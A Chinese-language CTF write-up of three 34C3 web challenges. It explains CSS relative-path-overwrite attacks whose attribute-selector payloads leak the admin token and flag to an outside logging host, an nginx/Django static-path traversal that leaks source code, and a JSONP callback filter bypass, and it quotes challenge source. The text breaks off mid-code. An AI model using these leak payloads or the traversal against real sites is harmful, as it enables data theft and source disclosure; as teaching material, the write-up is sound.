作者：LoRexxar'@知道创宇404实验室
34c3应该算是2017年年末的最后一个惊喜了，比赛题目虽然有非预期导致难度降了很多，但是从CTF中能学到什么才是最重要的，其中Web有3个XSS题目，思路非常有趣，这里整理了一下分享给大家。
#### urlstorage
初做这题目的时候感觉又很多问题，本以为最后使用的方法是正解，没想到的是非预期做法，忽略了题目本身的思路，抛开非预期不管，题目本身是一道非常不错的题目，用了css
rpo来获取页面的敏感内容。
###### CSS RPO
首先我们需要先解释一下什么是CSS RPO,RPO 全称Relative Path
Overwrite，主要是利用浏览器的一些特性和部分服务端的配置差异导致的漏洞，通过一些技巧，我们可以通过相对路径来引入其他的资源文件，以至于达成我们想要的目的。
先放几篇文章  
这里就不专门讲述RPO的种种攻击方式，这里只讨论CSS RPO，让我们接着看看题目。
###### Writeup
回到题目。
整个题目站点是django写的，然后前台用nginx做了一层反代。
然后整站带有CSP
    frame-ancestors 'none'; form-action 'self'; connect-src 'self'; script-src 'self'; font-src 'self' ; style-src 'self';
站点内主要有几个功能，每次登陆都会生成独立的token，`/urlstorage`页面可以储存一个url链接，`/flag`页面会显示自己的token和flag（根据token生成）
仔细研究不难发现一些其他的条件。
  1. flag页面只接受token的前64位，而token则是截取了token的前32位做了判断，在token后我们可以加入32位任意字符。
  2. flag页面有title xss，只要闭合``就可以构造xss，虽然位数不足，我们没办法执行任何js。
  3. urlstorage页面存在csrf，我们可以通过让服务端点击我们的链接来修改任意修改url
但是，很显然，这些条件其实并不够足以获取到服务端的flag。
但题目中永远不会出现无意义的信息，比如urlstorage页面，在刚才的讨论中，urlstorage页面中修改储存url的功能可以说毫无意义，这时候就要提到刚才说的RPO了。
首先整个站点是django写的，所有页面都是通过路由表实现的，所以无论我们在后面加入什么样的链接，返回页面都是和urlstorage一样的
    http://35.198.114.228/urlstorage/random_str/1321321421
    -->
    http://35.198.114.228/urlstorage
看上去好像没什么问题，但是页面内的静态资源是通过相对路径引入的。
因为我们修改了根url，所以css的引入url变成了
我们把当前页面当做成css样式表引入到了页面内。
这里我们可以通过设置url来向页面中加入一些可以控制的页面内容。
这里涉及到一个小技巧： **CSS在加载的时候与JS一样是逐行解析的，不同的是CSS会忽略页面中不符合CSS语法的行**
也就是说如果我们设置url为`%0a{}%0a*{color:red}`
那么页面内容会变成
当引入CSS逐行解析的时候，`color:red`就会被解析
通过设置可控的css，我们就可以使用一个非常特别的攻击思路。
我曾经在讲述CSP的博客中提到了这种攻击思路，通过CSS选择器来读取页面内容 
    a[href^=flag\?token\=0]{background: url(//l4w.io/rpo/logging.php?c=0);}
    a[href^=flag\?token\=1]{background: url(//l4w.io/rpo/logging.php?c=1);}
    ..
    a[href^=flag\?token\=f]{background: url(//l4w.io/rpo/logging.php?c=f);}
当匹配a标签的href属性中token开头符合的时候，就会自动向远程发送请求加载图片，服务端接收到请求，就代表着匹配成功了，这样的请求我们可以重复多次，就能获取到admin的token了。
这里有个小细节，服务端每次访问都会重新登陆一次，每次重新登陆都会刷新token，所以题目在contact页面还给出了一个脚本pow.py，通过这个脚本，服务端会有30s时间来访问我们的所有url，这样我们就有足够的时间拿到服务端的token。
但是问题来了，我们仍然没办法获取到flag页面的flag。
这里需要一个新的技巧。
在浏览器处理相对路径时，一般情况是获取当前url的最后一个`/`前作为base
url，但是如果页面中给出了base标签，那么就会读取base标签中的url作为base url。
那么，既然flag页面的token参数，我们有24位可控，那么我们完全可以引入`/urlstorage`作为base标签，这样CSS仍然会加载urlstorage页面内容，我们就可以继续使用CSS
RPO来获取页面内容。
这里还有个小坑
当我们试图使用下面的payload来获取flag时
    #flag[value^=34C3]{background: url(https://xxx?34c3);}
字符串首位的3不会被识别为字符串，必须使用双引号包裹才能正常解析。但是双引号被转义了。
这里我们需要换用`*`
    *号选择器代表这属性中包含这个字段，由于flag中有_存在，所以不会对flag的获取有影响
payload如下
    #flag[value*=C3_1]{background: url(//l4w.io/rpo/logging.php?flag=C3_1);}
    #flag[value*=C3_0]{background: url(//l4w.io/rpo/logging.php?flag=C3_1);}
    ..
    #flag[value*=C3_f]{background: url(//l4w.io/rpo/logging.php?flag=C3_1);}
完全的payload我就不专门写了，理解题目的思路比较重要。
整个题目的利用链非常精巧，服务端bot比我想象中要强大很多，有趣的是，整个题目存在配置的非预期，我一度认为非预期解法是正解。
###### 非预期
以前在pwnhub第二期中曾经接触到过一个知识点，django的静态资源路由（static）本身就是通过映射静态资源目录实现的，当django使用nginx做反代时，如果nginx配置出现问题，那么就有可能存在导致源码泄露的漏洞。34c3的所有django的web题目都有这个漏洞。
当我们访问
    http://35.198.114.228/static../views.py
就可以获取到源码，让我们锁定flag页面的源码
    @login_required
    def flag(req):
        user_token = req.GET.get("token")
        if not user_token:
            messages.add_message(req, messages.ERROR, 'no token provided')
            return redirect('index')
        user_flag = "34C3_"+hashlib.sha1("foqweqdzq%s".format(user_token).encode("utf-8")).hexdigest()
        return render(req, 'flag.html', dict(user=req.user, 
            valid_token=user_token.startswith(req.user.profile.token), 
            user_flag=user_flag,
            user_token=user_token[:64],))
我们可以看到user_flag是通过token生成的，而token是登陆时随机生成的
    def login(req):
        if req.user.is_authenticated:
            return redirect('index')
        if req.method == "POST":
            username = req.POST.get("username")
            password = req.POST.get("password")
            if not username or not password:
                messages.add_message(req, messages.ERROR, 'No username/password provided')
            elif len(password) 
有趣的是，这道题目也是用django写的，也是用了nginx做反代，于是源码再一次泄露了，通过源码我们可以简化很多思路。
在分析源码之前，我们可以简单的从黑盒的角度看看题目的各种信息。
1、首先从feed页面可以发现，django 1.11.8 开启了debug
然后我们可以拿到路由表
    ^$ [name='index']
    ^post/(?P[^/]+)$ [name='post']
    ^flag1$ [name='flag1']
    ^flag2$ [name='flag2']
    ^flag_api$ [name='flag_api']
    ^publish$ [name='publish']
    ^feed$ [name='feed']
    ^contact$ [name='contact']
    ^login/$ [name='login']
    ^logout/$ [name='logout']
    ^signup/$ [name='signup']
    ^static\/(?P.*)$
同时还会泄露部分源码，可以发现flag1和flag2的获取方式分别为
  1. admin账号访问flag1就可以得到flag1
  2. flag2需要向flag_api发送请求
2、feed有一个`type`参数可以指定json、jsonp的返回类型，同时还接受cb参数，cb中有很多很多过滤，但是可以被绕过
3、页面中有比较严格的CSP
    default-src 'none'; base-uri 'none'; frame-ancestors 'none'; connect-src 'self'; img-src 'self'; style-src 'self' https://fonts.googleapis.com/; font-src 'self' https://fonts.gstatic.com/s/materialicons/; form-action 'self'; script-src 'self';
4、content没有任何转义，存在XSS漏洞
5、bot访问的是本地的django，而不是nginx
    superblog1 + superblog2 information
    When submitting a post ID to the admin, he will visit the URL http://localhost:1342/post/.
    He uses a headless Google Chrome, version 63.0.3239.108.
其实题目不需要完整源码，我们仍然可以想到差不多的思路，这里我们再从源码的角度分析一下，便于理解。
    views.py
    import re
    import json
    import traceback
    import random
    from django.http import HttpResponse
    from django.shortcuts import redirect, render
    from django.template import loader
    from django.views.decorators.http import require_safe, require_POST
    from django.contrib.auth.decorators import user_passes_test
    from django.core.exceptions import PermissionDenied
    from django.contrib.auth import login, authenticate
    from django.contrib.auth.forms import UserCreationForm
    from django.contrib import messages
    import models
    from random import SystemRandom
    def get_user_posts(user):
        if not user.is_authenticated:
            return []
        else:
            return models.Post.objects.filter(author=user).all()
    gen = SystemRandom()
    def generate_captcha(req):
        n = 2
        d = 8
        ops = '+'
        while True:
            nums = [gen.randint(10**(d-1), 10**d-1) for _ in range(n)]
            ops = [gen.choice(ops) for _ in range(n-1)]
            captcha = ' '.join('%s %s' % a for a in zip(nums,ops+[1]))[:-2]
            answer = eval(captcha)
            if -2**31 + 10 <= answer <= 2**31-10:
                break
        # print 'Captcha:', captcha
        req.session['captcha'] = captcha
        req.session['captcha_answer'] = str(eval(captcha))
        if random.random() < 0.003:
            req.session['captcha'] = r'(__import__("sys").stdout.write("I WILL NOT RUN UNTRUSTED CODE FROM THE INTERNET\n"*1337), %s)[1]'%req.session['captcha']
        return req.session.get('captcha')
    def check_captcha(req):
        res = req.POST.get('captcha_answer') == req.session.get('captcha_answer')
        # if not res: